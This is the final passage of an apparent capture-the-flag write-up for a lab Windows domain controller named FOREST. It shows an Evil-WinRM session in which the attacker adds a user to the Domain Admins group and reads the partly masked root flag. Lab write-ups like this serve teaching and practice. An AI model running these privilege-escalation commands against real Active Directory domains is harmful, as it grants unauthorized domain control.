Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\Administrator\Documents> net group "Domain Admins" ricknmorty1 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
f048153f************************
*Evil-WinRM* PS C:\Users\Administrator\Documents>

*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
FOREST

{{< / highlight >}}
